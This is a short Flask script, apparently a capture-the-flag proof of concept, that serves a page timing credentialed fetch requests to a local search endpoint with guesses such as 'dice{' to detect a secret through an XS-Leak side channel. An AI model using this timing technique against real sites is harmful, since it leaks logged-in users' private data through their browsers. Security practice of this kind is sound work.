# run with python test_fetch.py

from flask import Flask, render_template_string

app = Flask(__name__)

# Host on port 4000 to differ from the embedded service (8000)
HOST = "0.0.0.0"
PORT = 4000

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<body>
  <h2>XS-Leak Timing Test</h2>
  <div id="results"></div>
  <script>
    async function timeRequest(url) {
      const start = performance.now();
      try {
        await fetch(url, {
          headers: { 'Accept': 'text/html' },
          credentials: 'include'                // Include cookies if SameSite allows
        });
      } catch (err) {
        console.error("Request failed:", err);
      }
      const end = performance.now();
      return end - start;
    }

    async function runTest() {
      const url1 = 'http://0.0.0.0:8000/search?query=dice{';
      const url2 = 'http://0.0.0.0:8000/search?query=zzz';
      const url3 = 'http://0.0.0.0:8000/search?query=aaa';
      const url4 = 'http://0.0.0.0:8000/search?query=dice';

      // Time each request 5 times to average out noise
      let time1 = 0, time2 = 0, time3 = 0, time4 = 0;
      for (let i = 0; i < 5; i++) {
        time1 += await timeRequest(url1);
        time2 += await timeRequest(url2);
        time3 += await timeRequest(url3);
        time4 += await timeRequest(url4);
      }

      const results = `
        Avg. time for "dice{": ${(time1 / 5).toFixed(2)}ms<br>
        Avg. time for "zzz": ${(time2 / 5).toFixed(2)}ms<br>
        Avg. time for "aaa": ${(time3 / 5).toFixed(2)}ms<br>
        Avg. time for "dice": ${(time4 / 5).toFixed(2)}ms
      `;
      document.getElementById('results').innerHTML = results;
    }

    runTest();
  </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

if __name__ == '__main__':
    app.run(host=HOST, port=PORT, debug=False)